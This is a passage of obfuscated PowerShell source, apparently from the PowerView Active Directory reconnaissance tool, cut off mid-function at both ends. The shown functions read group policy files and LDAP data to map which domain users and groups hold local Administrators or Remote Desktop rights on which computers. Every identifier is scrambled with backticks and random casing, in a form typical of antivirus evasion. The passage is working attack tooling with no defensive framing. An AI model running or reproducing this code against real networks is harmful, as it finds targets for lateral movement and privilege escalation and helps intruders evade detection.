                            if ((${a} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${A} -eq 'objectguid') -or (${a} -eq 'usercertificate') -or (${A} -eq 'ntsecuritydescriptor') -or (${A} -eq 'logonhours')) {
                                ${pr`op}[${a}] = ${_}.Attributes[${a}]
                            }
                            else {
                                ${V`Al`UEs} = @()
                                foreach (${v} in ${_}.Attributes[${A}].GetValues([byte[]])) {
                                    ${vAl`U`ES} += [System.Text.Encoding]::UTF8.GetString(${V})
                                }
                                ${P`ROP}[${A}] = ${VAlU`eS}
                            }
                        }
                    }
                    else {
                        ${p`ROp} = ${_}.Properties
                    }

                    if (${pSbound`PAR`AME`TE`RS}['SearchBase'] -and (${s`eA`RcHba`SE} -Match '^GC://')) {
                        ${G`Po} = coNV`e`R`T-LdAp`p`Roperty -Properties ${PR`OP}
                        try {
                            ${gpO`DN} = ${G`pO}.distinguishedname
                            ${Gp`O`domAin} = ${g`P`oDN}.SubString(${G`p`ODn}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            ${g`PcFI`LeSYSP`AtH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                            ${g`PO} | AD`d-`me`mBER NoTe`pRO`p`ertY 'gpcfilesyspath' ${GpCF`ile`S`Yspa`Th}
                        }
                        catch {
                            W`RITe-Ve`RboSE "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                        }
                    }
                    else {
                        ${G`po} = c`ONvE`Rt-L`D`ApPR`o`PertY -Properties ${P`ROP}
                    }
                    ${G`pO}.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                }
                ${g`pO}
            }
            if (${r`e`sULts}) {
                try { ${r`e`SuLTs}.dispose() }
                catch {
                    wRit`e-vERBo`se "[Get-DomainGPO] Error disposing of the Results object: $_"
                }
            }
        }
    }
}


function GeT-d`oMAi`NGPO`LOCAl`gr`O`UP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${TR`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${Id`EntI`Ty},

        [Switch]
        ${rESoLVem`Em`BE`RS`Tosids},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`MAiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDAp`FI`LTEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEARC`hb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RVEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EaRCHs`c`ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`S`UlTpagES`i`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRVEr`T`ImEli`mIT},

        [Switch]
        ${TOMb`S`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ede`NTial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SE`A`RCH`EraRgUM`EnTs} = @{}
        if (${pSBOU`N`d`paRaMEtERs}['Domain']) { ${sEarChe`RaRGU`M`ENTs}['Domain'] = ${d`oM`AIn} }
        if (${p`sbo`UNDpar`AmEteRS}['LDAPFilter']) { ${S`EA`Rc`H`eRARg`UMEnTs}['LDAPFilter'] = ${dom`A`IN} }
        if (${PSBoUNd`Pa`R`A`meTERs}['SearchBase']) { ${se`ARCheRARgU`men`Ts}['SearchBase'] = ${sE`Ar`CHba`SE} }
        if (${p`S`BoUnd`pa`R`AMEtErS}['Server']) { ${SEARCheR`AR`Gu`ME`N`Ts}['Server'] = ${sErV`er} }
        if (${P`SBou`NdParaM`E`TeRS}['SearchScope']) { ${SeaRc`HerArG`Um`EN`TS}['SearchScope'] = ${sEAR`c`H`SCOPE} }
        if (${PsbO`U`NdpArA`MeTeRs}['ResultPageSize']) { ${sEar`Ch`E`Ra`RgumeNtS}['ResultPageSize'] = ${RESu`l`TPAgESiZE} }
        if (${P`SBO`Und`P`Ar`AmEtErs}['ServerTimeLimit']) { ${sE`AR`cHE`RArG`UMeNTs}['ServerTimeLimit'] = ${s`eRVEr`TiMeli`m`iT} }
        if (${p`sB`oUNDParam`eteRs}['Tombstone']) { ${sE`A`RCH`erarGu`MEn`TS}['Tombstone'] = ${to`Mbst`oNe} }
        if (${Ps`BOunD`P`Ar`A`MeTERs}['Credential']) { ${SeA`R`cHErArgu`ME`NtS}['Credential'] = ${Cr`ED`e`NTiAL} }

        ${cOn`VerTarG`U`MenTs} = @{}
        if (${psbo`U`NdPARa`meT`ers}['Domain']) { ${cOnv`ertar`Gu`meNTs}['Domain'] = ${domA`iN} }
        if (${ps`BouNdpAra`M`etERS}['Server']) { ${cOnv`ER`TA`R`gU`mentS}['Server'] = ${SE`RvER} }
        if (${pSBOu`N`DpaRAMet`ERs}['Credential']) { ${CO`NvErTA`R`guMen`TS}['Credential'] = ${Cre`DeNT`IaL} }

        ${s`plitO`PTion} = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if (${PSbO`Undpa`R`AmeTeRs}['Identity']) { ${Sear`chERa`RG`Ume`Nts}['Identity'] = ${i`d`ENT`ity} }

        gEt-`domA`iNgPo @SearcherArguments | FOR`EAcH-o`Bje`CT {
            ${g`pOdisPlaY`N`A`ME} = ${_}.displayname
            ${gpO`Name} = ${_}.name
            ${GpoP`A`Th} = ${_}.gpcfilesyspath

            ${pAR`SeAr`gS} =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if (${PsBo`UnDP`A`Ram`eters}['Credential']) { ${p`Ar`SEar`gs}['Credential'] = ${cR`E`d`eNTiAL} }

            
            ${i`Nf} = GeT-`gptT`M`Pl @ParseArgs

            if (${I`Nf} -and (${I`Nf}.psbase.Keys -contains 'Group Membership')) {
                ${meMBE`R`Sh`IPS} = @{}

                
                ForEach (${M`E`MBe`RShip} in ${I`NF}.'Group Membership'.GetEnumerator()) {
                    ${GRO`UP}, ${REla`T`iOn} = ${mEMb`ERsh`IP}.Key.Split('__', ${SP`lI`TOP`TION}) | F`OR`EACh-obj`ECt {${_}.Trim()}
                    
                    ${mem`BeRS`hi`PVA`lUE} = ${MeMb`ErS`Hip}.Value | Wh`Ere-OBje`ct {${_}} | FOrEAc`H`-o`BJ`EcT { ${_}.Trim('*') } | wher`E`-ObJECT {${_}}

                    if (${psb`OUNd`pARAMe`TERs}['ResolveMembersToSIDs']) {
                        
                        ${gRO`U`pMEMBERs} = @()
                        ForEach (${M`eM`BER} in ${MEMb`ershIp`V`Al`UE}) {
                            if (${meMb`Er} -and (${mEMb`Er}.Trim() -ne '')) {
                                if (${mE`mBer} -notmatch '^S-1-.*') {
                                    ${COn`VE`Rt`ToaRGUmEn`Ts} = @{'ObjectName' = ${me`mb`Er}}
                                    if (${pSbOU`N`dPar`Am`EteRS}['Domain']) { ${cOnv`ERtTo`A`R`GUM`entS}['Domain'] = ${d`omA`In} }
                                    ${mE`m`BERsiD} = conVE`RttO`-`Sid @ConvertToArguments

                                    if (${MeM`B`Er`Sid}) {
                                        ${GrOUP`m`Emb`eRs} += ${Me`MB`ersid}
                                    }
                                    else {
                                        ${GRO`Up`ME`Mb`Ers} += ${ME`Mb`Er}
                                    }
                                }
                                else {
                                    ${GrOUPmem`Be`Rs} += ${meM`BeR}
                                }
                            }
                        }
                        ${MEmBERshIP`Va`l`UE} = ${gro`U`pm`emBErs}
                    }

                    if (-not ${mEmbe`Rs`hI`pS}[${Gr`OuP}]) {
                        ${MEMB`e`RshIpS}[${gr`ouP}] = @{}
                    }
                    if (${mEMB`ERS`hI`p`Va`LUE} -isnot [System.Array]) {${me`M`BErsh`iPVAL`Ue} = @(${MEMBe`RsHip`V`A`LUE})}
                    ${m`ember`sHIPS}[${g`ROUp}].Add(${re`l`ATIon}, ${mem`BeR`S`HiPVaLUe})
                }

                ForEach (${m`embEr`Ship} in ${mE`mbers`hiPS}.GetEnumerator()) {
                    if (${m`eMbE`RS`hiP} -and ${mEm`BE`Rsh`IP}.Key -and (${me`m`BerSh`IP}.Key -match '^\*')) {
                        
                        ${gRO`Up`sId} = ${M`emB`eRShip}.Key.Trim('*')
                        if (${G`ROUpSiD} -and (${gr`ou`pSID}.Trim() -ne '')) {
                            ${groUpN`A`ME} = CO`NV`eRTFROM`-siD -ObjectSID ${grO`UPsId} @ConvertArguments
                        }
                        else {
                            ${Gr`OuPNA`Me} = ${fA`l`SE}
                        }
                    }
                    else {
                        ${G`ROUp`NamE} = ${ME`mbers`hIP}.Key

                        if (${GRou`PnA`me} -and (${G`RO`UpNA`me}.Trim() -ne '')) {
                            if (${gR`o`UPN`AME} -match 'Administrators') {
                                ${g`ROU`pSID} = 'S-1-5-32-544'
                            }
                            elseif (${GR`Ou`PNa`ME} -match 'Remote Desktop') {
                                ${G`ROu`PSID} = 'S-1-5-32-555'
                            }
                            elseif (${GrO`Up`NaME} -match 'Guests') {
                                ${gr`o`UPSId} = 'S-1-5-32-546'
                            }
                            elseif (${GRoU`p`NAme}.Trim() -ne '') {
                                ${c`Onve`R`TtOarGUMenTS} = @{'ObjectName' = ${Gr`O`UPnAME}}
                                if (${PsBouN`d`pARAm`e`T`eRs}['Domain']) { ${CONVERt`T`OArguM`EN`TS}['Domain'] = ${d`oM`AIN} }
                                ${G`R`OUPsId} = COnVeRt`To-s`ID @ConvertToArguments
                            }
                            else {
                                ${g`R`o`UpSid} = ${N`ULl}
                            }
                        }
                    }

                    ${Gpo`g`RoUp} = n`ew-`o`BjecT P`SObj`eCT
                    ${gP`ogRo`Up} | A`dd-m`emBEr N`oTEpR`OPErty 'GPODisplayName' ${GpOdi`SP`LAy`NAMe}
                    ${gpo`GROUP} | Add-`M`EMBER N`otEpRoPER`TY 'GPOName' ${gPO`N`AMe}
                    ${GP`O`GROUP} | a`D`D-MEMBER NoTePR`O`PertY 'GPOPath' ${gpoPa`Th}
                    ${gpO`G`ROuP} | adD-`mE`mBer NO`TeproP`ER`TY 'GPOType' 'RestrictedGroups'
                    ${gPoG`ROup} | aDd`-mem`Ber nOt`ePROPe`RtY 'Filters' ${N`ULL}
                    ${Gp`OgRo`Up} | a`dd-`membER noTEpR`OP`Er`TY 'GroupName' ${GRO`U`pnA`mE}
                    ${GP`O`GRoUp} | A`dD-memB`Er NOtEP`R`o`peRtY 'GroupSID' ${gR`o`UPSID}
                    ${gPo`GRO`Up} | A`dD-MEm`B`er n`OTEP`RopER`Ty 'GroupMemberOf' ${MEMb`ER`shiP}.Value.Memberof
                    ${G`PO`gRo`UP} | aD`d`-MembEr NOt`E`PROPerTy 'GroupMembers' ${Me`Mbe`Rsh`IP}.Value.Members
                    ${gpOg`R`OUp}.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    ${gpo`grO`Up}
                }
            }

            
            ${P`ARsEaR`gs} =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            G`E`T-GR`OuPsxml @ParseArgs | f`OrEA`c`h-`ObjEct {
                if (${Ps`BoUNdpaRAMe`T`Ers}['ResolveMembersToSIDs']) {
                    ${g`ROuPMemb`e`RS} = @()
                    ForEach (${ME`m`BEr} in ${_}.GroupMembers) {
                        if (${MEM`BER} -and (${Mem`B`er}.Trim() -ne '')) {
                            if (${M`EMb`Er} -notmatch '^S-1-.*') {

                                
                                ${C`oNVE`R`TToARg`U`ments} = @{'ObjectName' = ${g`ROUpn`Ame}}
                                if (${p`SbOUND`Pa`RamE`TeRs}['Domain']) { ${Conver`T`T`OARg`U`MeNTs}['Domain'] = ${do`MA`iN} }
                                ${mEM`Be`R`SiD} = c`onV`eR`Tto`-SID -Domain ${dOmA`In} -ObjectName ${m`EMbeR}

                                if (${Me`MB`ERS`iD}) {
                                    ${g`RoU`pM`EMBers} += ${m`Em`BerSid}
                                }
                                else {
                                    ${GroU`PMEM`B`ERs} += ${meM`Ber}
                                }
                            }
                            else {
                                ${gROu`P`MEMBe`RS} += ${mE`mber}
                            }
                        }
                    }
                    ${_}.GroupMembers = ${g`RO`UPmembE`RS}
                }

                ${_} | adD`-m`EmBER N`O`TEpROPeRtY 'GPODisplayName' ${gpODI`S`PlaYNaMe}
                ${_} | aDd-`MEMB`Er NOte`P`ROpERTy 'GPOName' ${G`pONamE}
                ${_} | aDd-m`E`mbEr NO`T`EPRO`PertY 'GPOType' 'GroupPolicyPreferences'
                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                ${_}
            }
        }
    }
}


function G`eT-doMai`NgPou`serLOcALGRo`U`PmaPp`iNG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${I`dEn`TitY},

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        ${LO`cAL`GROUp} = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${Se`AR`CHBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`erVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`E`ARchscopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`Sultp`Age`si`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVeR`TIM`el`I`miT},

        [Switch]
        ${TO`MbstO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`D`EnTIaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${C`ommonaR`gumEn`Ts} = @{}
        if (${Ps`B`Ou`N`Dpa`RaMETerS}['Domain']) { ${COM`MOnar`GUmE`N`TS}['Domain'] = ${DOma`In} }
        if (${pSBoUN`dP`ArA`metErS}['Server']) { ${comm`o`NA`RguMEntS}['Server'] = ${s`ER`VEr} }
        if (${P`sBo`UNd`p`ARAM`eteRS}['SearchScope']) { ${COm`MO`NaRgUme`N`TS}['SearchScope'] = ${sEArC`h`sC`opE} }
        if (${PSB`o`UNDP`A`RAMeters}['ResultPageSize']) { ${c`oMMoN`ArGU`MeN`Ts}['ResultPageSize'] = ${rEs`U`LtpA`GEsIZe} }
        if (${pS`BoUND`P`ARA`m`eTErs}['ServerTimeLimit']) { ${cOM`MoNaRgUme`N`Ts}['ServerTimeLimit'] = ${S`ErveR`TImel`i`Mit} }
        if (${PsbO`Un`DParAMET`E`RS}['Tombstone']) { ${cO`mmONa`R`GUM`entS}['Tombstone'] = ${t`omb`stONe} }
        if (${PSb`Ou`ND`PARam`EteRs}['Credential']) { ${cOMmONaRG`Um`e`NTs}['Credential'] = ${cR`e`dENT`iAl} }
    }

    PROCESS {
        ${tA`Rgets`idS} = @()

        if (${PsBou`NdpArA`Me`Te`RS}['Identity']) {
            ${TaRGE`Ts`IdS} += get-DoMAIN`Ob`JE`cT @CommonArguments -Identity ${i`d`entitY} | SeL`e`c`T-oB`jECT -Expand OB`Jects`Id
            ${TARgE`TOBj`Ec`Ts`id} = ${TAr`ge`TS`Ids}
            if (-not ${tArGE`Tsi`Ds}) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            
            ${taRG`Et`sIDS} = @('*')
        }

        if (${lo`calG`Roup} -match 'S-1-5') {
            ${tAR`gEt`loCa`LS`iD} = ${LocALg`R`oUp}
        }
        elseif (${LOC`ALgR`OUp} -match 'Admin') {
            ${T`Ar`G`eTLoca`lsId} = 'S-1-5-32-544'
        }
        else {
            
            ${tar`getLoCAl`s`iD} = 'S-1-5-32-555'
        }

        if (${tAR`GeTs`I`ds}[0] -ne '*') {
            ForEach (${TaR`Ge`TSid} in ${tArGE`T`si`Ds}) {
                WrIte-V`erB`oSe "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                ${taR`gE`Ts`ids} += get-domAi`Ng`Ro`Up @CommonArguments -Properties 'objectsid' -MemberIdentity ${T`ARge`TSID} | se`lECt`-oBJeCt -ExpandProperty O`BjeCTSID
            }
        }

        W`RIte`-VERbOSe "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        wri`T`e-VE`RBoSe "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        ${g`p`O`GROuPs} = ge`T-`dom`Ain`GPOLOCALGRoUp @CommonArguments -ResolveMembersToSIDs | Fore`AcH`-o`BJEct {
            ${GpOG`R`ouP} = ${_}
            
            if (${gPoG`Ro`Up}.GroupSID -match ${TArGEt`LoC`Al`SID}) {
                ${g`POgr`OUp}.GroupMembers | WH`Er`E-oB`JEct {${_}} | foR`e`ACH`-`OBjECT {
                    if ( (${TaR`gETs`IDs}[0] -eq '*') -or (${t`ARG`E`TsIDS} -Contains ${_}) ) {
                        ${GpO`Gr`OUP}
                    }
                }
            }
            
            if ( (${Gp`o`grOUp}.GroupMemberOf -contains ${t`Ar`GeTLOcaLs`iD}) ) {
                if ( (${TARgeTs`I`DS}[0] -eq '*') -or (${t`A`RgEts`IdS} -Contains ${Gp`OGR`Oup}.GroupSID) ) {
                    ${gpOg`R`oUP}
                }
            }
        } | sO`R`T-obJ`ecT -Property G`PONAMe -Unique

        ${G`p`OgrOU`PS} | whe`RE-O`BJect {${_}} | fOrEacH`-`ObJe`CT {
            ${G`PonA`ME} = ${_}.GPODisplayName
            ${g`pOG`UId} = ${_}.GPOName
            ${GP`O`patH} = ${_}.GPOPath
            ${Gp`o`TyPe} = ${_}.GPOType
            if (${_}.GroupMembers) {
                ${GPoMeMb`E`Rs} = ${_}.GroupMembers
            }
            else {
                ${g`P`omEmbErS} = ${_}.GroupSID
            }

            ${fIl`Te`RS} = ${_}.Filters

            if (${T`AR`gETsiDS}[0] -eq '*') {
                
                ${TAR`GE`TO`Bj`Ec`TSIDS} = ${G`PomeMB`E`Rs}
            }
            else {
                ${ta`Rg`Etob`jECTsiDs} = ${tAr`get`oBj`EcTSiD}
            }

            
            Ge`T-`DoMaInoU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink ${G`POGU`iD} | Fo`RE`Ach-`obJ`ECt {
                if (${fi`lTeRS}) {
                    ${oUco`mp`UTE`RS} = GET-`D`O`MAiNCOmpu`T`Er @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase ${_}.Path | W`HEre-`oB`jECT {${_}.distinguishedname -match (${f`IlTE`Rs}.Value)} | S`El`ecT-`oBJe`CT -ExpandProperty dnS`HOSt`NamE
                }
                else {
                    ${Ouc`Om`P`UtErS} = g`Et-DOmaiN`coM`puT`Er @CommonArguments -Properties 'dnshostname' -SearchBase ${_}.Path | SElECT`-objE`cT -ExpandProperty dN`shOSt`Na`mE
                }

                if (${O`UC`OMpU`TERS}) {
                    if (${Ouc`OmpUtE`RS} -isnot [System.Array]) {${ou`c`o`MpuTeRS} = @(${O`UcOmpU`Ters})}

                    ForEach (${ta`R`Get`SID} in ${TA`RgEt`ObJ`eCts`I`Ds}) {
                        ${O`B`Ject} = GET`-`D`oMaIno`BjeCT @CommonArguments -Identity ${TAr`Ge`TSID} -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        ${ISGr`Oup} = @('268435456','268435457','536870912','536870913') -contains ${o`Bj`eCt}.samaccounttype

                        ${G`po`lOCalGRO`UP`map`Ping} = neW-o`BjE`ct psOb`jEct
                        ${G`pOLOcALgRO`Upm`APP`i`NG} | AdD-m`e`mBEr n`otePR`o`pErTY 'ObjectName' ${Ob`je`Ct}.samaccountname
                        ${g`poLoCaLgROu`pma`Pp`inG} | ad`d-`MemBeR NoTe`PRo`Pe`RTy 'ObjectDN' ${O`BjECt}.distinguishedname
                        ${g`pOlO`CAl`GroUP`maPp`iNg} | ad`D`-MemB`ER NOt`epRop`e`RTY 'ObjectSID' ${Ob`jE`Ct}.objectsid
                        ${gpO`L`ocaLGRo`UPMAPPi`NG} | A`dd`-m`emBer N`ot`ePRopeR`Ty 'Domain' ${D`OM`AIn}
                        ${GPOL`oCAl`Gr`oU`pm`APP`Ing} | AdD`-`MeM`BeR NOTeP`RO`PeRty 'IsGroup' ${iS`g`RoUP}
                        ${g`PO`l`oCal`g`Ro`UPmAPPing} | adD`-Mem`BER No`TEPrO`Pe`Rty 'GPODisplayName' ${gp`o`Name}
                        ${g`poL`OCaLgr`OupmAPp`I`Ng} | A`Dd-me`MbeR NOTE`PROpeR`TY 'GPOGuid' ${gP`oGUiD}
                        ${gpoLOcA`L`groupM`Ap`PIng} | ADd-Me`M`BEr n`OT`EPrOPeR`Ty 'GPOPath' ${gP`OPaTH}
                        ${gPO`l`OCa`l`G`RoUp`MapPiNG} | A`dd`-MEmBEr NOT`eP`RoPer`Ty 'GPOType' ${g`pOt`ype}
                        ${G`pol`O`CalgRoUpMApPi`NG} | ADD-`ME`MBER note`pR`OPertY 'ContainerName' ${_}.Properties.distinguishedname
                        ${GPOL`OCaLGr`OU`pmAppi`NG} | aDD`-mE`mBER n`OtEPRoP`er`TY 'ComputerName' ${oUCom`pU`TERs}
                        ${GPO`lOcAlG`Rou`PMA`PP`inG}.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        ${G`pOlOcAlgRoU`pMA`ppiNg}
                    }
                }
            }

            
            GET-dOm`Ai`NsI`Te @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink ${gPOg`UId} | fOrEaCH`-ObJ`e`ct {
                ForEach (${T`AR`G`ETsid} in ${tARGET`obJ`E`CTsIDs}) {
                    ${Obj`E`cT} = gEt-Dom`AInOb`j`ect @CommonArguments -Identity ${T`ARG`etsiD} -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    ${is`G`Roup} = @('268435456','268435457','536870912','536870913') -contains ${oB`JE`ct}.samaccounttype

                    ${Gp`Ol`oCaLGRO`UpMap`PinG} = Ne`W`-ob`Ject PSobje`ct
                    ${GPol`ocA`L`gROupMaP`ping} | ad`d-MeMb`Er NoTe`pR`oPe`RtY 'ObjectName' ${Ob`J`eCt}.samaccountname
                    ${GpOlocAL`GrOUP`MapP`iNG} | Ad`d-M`embEr NOte`Prop`erTy 'ObjectDN' ${oBj`Ect}.distinguishedname
                    ${GpO`l`OCaL`g`RoUpmAp`pi`Ng} | aDd`-m`EMBer no`TEpR`OPeR`TY 'ObjectSID' ${O`BJE`ct}.objectsid
                    ${gPol`oC`Alg`Ro`UpM`APpinG} | A`Dd-m`em`BEr no`TEPr`OpeRtY 'IsGroup' ${IS`G`RoUp}
                    ${Gpo`l`oC`Al`gro`UpMapPINg} | add-`m`eMBer n`ot`EProP`ERty 'Domain' ${DO`MaIN}
                    ${GpO`LOc`A`l`GRoUP`mAP`piNg} | AdD-m`E`mbER nOTePro`P`ERtY 'GPODisplayName' ${g`POna`mE}
                    ${G`Po`L`OcALgrOUPmappI`Ng} | A`dd-`MembER No`TEP`ROp`ERtY 'GPOGuid' ${Gpo`GUid}
                    ${G`P`oLoCALg`ROupm`APPInG} | A`D`d-MemBeR N`oT`EP`ROpERTy 'GPOPath' ${G`po`pAth}
                    ${gPol`O`cAl`gROUp`MApP`InG} | AD`d`-mEMBer not`ep`ROpeRTY 'GPOType' ${gpoT`ypE}
                    ${gPOl`OCALGr`oUpMAP`piNG} | aD`D-ME`MbER n`otep`RoPERty 'ContainerName' ${_}.distinguishedname
                    ${GP`olOCALGR`oUp`mappi`NG} | a`dd-mEM`Ber noTePR`Op`ERTy 'ComputerName' ${_}.siteobjectbl
                    ${gpolO`CALGrouP`Ma`PPI`Ng}.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    ${gP`oLOc`Al`GROUPMaP`pI`Ng}
                }
            }
        }
    }
}


function geT-DoMAiNGPOc`o`mpUT`erLO`CALgRo`UPMapp`InG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = ${TR`Ue}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${c`om`P`UtE`RidENTity},

        [Parameter(Mandatory = ${T`RUE}, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        ${OuI`D`enT`ITy},

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        ${l`oCaL`gR`oup} = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`EARchb`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ERver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`A`R`chscopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rESU`Ltp`A`GEsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VErT`im`E`lImIT},

        [Switch]
        ${tOm`B`STONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`D`eN`TiAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${c`OMMOn`ARGUme`NTS} = @{}
        if (${p`SBo`U`NDPaRAMET`ers}['Domain']) { ${c`O`MM`oNarG`UmeNTS}['Domain'] = ${d`omA`In} }
        if (${psB`o`U`Nd`P`ArAMeTers}['Server']) { ${C`oMmOnAr`gUM`EnTS}['Server'] = ${S`er`Ver} }
        if (${PS`Boun`DPaR`Am`EterS}['SearchScope']) { ${cOMmoNA`RGumE`N`TS}['SearchScope'] = ${sEA`RcH`SC`oPE} }
        if (${p`sBOun`dpA`RAM`eTErs}['ResultPageSize']) { ${CO`MmoN`Argum`e`NTS}['ResultPageSize'] = ${rESultP`A`gE`sIzE} }
        if (${P`sB`OUnDPARa`m`EtERS}['ServerTimeLimit']) { ${c`ommo`NArG`UMen`TS}['ServerTimeLimit'] = ${S`eRVErTim`eLI`M`IT} }
        if (${P`Sbou`NdP`ArAM`ETeRs}['Tombstone']) { ${c`omMonarGU`M`eNTS}['Tombstone'] = ${TOMb`sTO`NE} }
        if (${P`sB`o`UndPA`RAMeTERS}['Credential']) { ${CoM`monArG`Ume`NtS}['Credential'] = ${crED`En`T`iAl} }
    }

    PROCESS {
        if (${PSBOUndPA`R`AMEt`Ers}['ComputerIdentity']) {
            ${C`OMPu`T`ers} = G`ET-d`OmAI`NCO`MpUteR @CommonArguments -Identity ${Comp`UtEr`iD`eNTI`TY} -Properties 'distinguishedname,dnshostname'

            if (-not ${COm`PuTE`RS}) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach (${co`mp`Uter} in ${co`MPUTe`Rs}) {

                ${gp`OG`UiDS} = @()

                
                ${D`N} = ${c`o`mPUtER}.distinguishedname
                ${Ou`in`dex} = ${Dn}.IndexOf('OU=')
                if (${OUI`NDeX} -gt 0) {
                    ${ouNA`me} = ${d`N}.SubString(${oU`indEx})
                }
                if (${oUn`AmE}) {
                    ${GP`OG`UIdS} += Get`-do`MA`InOu @CommonArguments -SearchBase ${o`UNA`Me} -LDAPFilter '(gplink=*)' | For`Eac`h-o`BJ`ECt {
                        SEl`e`Ct`-s`TRIng -InputObject ${_}.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | fO`R`eA`CH-`OBJEcT {${_}.Matches | SeLeCT`-obj`e`Ct -ExpandProperty vA`luE }
                    }
                }

                
                WR`I`Te-Ve`RbOsE "Enumerating the sitename for: $($Computer.dnshostname)"
                ${coMPuT`eRSi`TE} = (g`Et-net`cO`MpuTER`sITEN`A`mE -ComputerName ${CO`mpU`TeR}.dnshostname).SiteName
                if (${coM`Pu`TE`RSite} -and (${COMp`UTEr`s`ite} -notmatch 'Error')) {
                    ${G`pO`GuIds} += GEt-`DomAInS`I`TE @CommonArguments -Identity ${COM`pu`TerSitE} -LDAPFilter '(gplink=*)' | FO`REAch-`OBjECT {
                        se`LEC`T-sTriNg -InputObject ${_}.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | FO`REAcH-o`B`jeCT {${_}.Matches | S`e`lEcT-`oBJecT -ExpandProperty V`AluE }
                    }
                }

                
